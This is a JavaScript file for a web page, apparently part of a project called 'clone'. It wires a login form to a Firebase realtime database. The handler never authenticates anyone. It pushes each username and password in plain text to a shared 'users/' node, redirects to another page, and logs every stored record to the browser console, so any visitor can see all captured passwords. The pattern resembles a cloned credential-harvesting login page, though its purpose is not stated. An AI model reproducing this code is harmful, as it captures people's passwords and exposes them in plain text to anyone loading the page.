// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyDnEHIyWmpGXqV2I6bFWiV9M2Wi1_JM-NQ",
  authDomain: "clone-11a3c.firebaseapp.com",
  databaseURL: "https://clone-11a3c-default-rtdb.firebaseio.com",
  projectId: "clone-11a3c",
  storageBucket: "clone-11a3c.appspot.com",
  messagingSenderId: "876069541281",
  appId: "1:876069541281:web:04d1a06af526fe56d467e0",
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const database = firebase.database();

document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault();

  // Get values from the form
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  // Save data to the database
  database.ref('users/').push({
      username: username,
      password: password // Don't store passwords in plain text!
  }).then(() => {
      // Redirect to the main/home page
      window.location.href = 'index3.html';
  }).catch((error) => {
      console.error("Error saving data: ", error);
  });
});
database.ref('users/').on('value', (snapshot) => {
  const users = snapshot.val();
  // Handle your user data as needed (e.g., display it on the page)
  console.log(users);
});
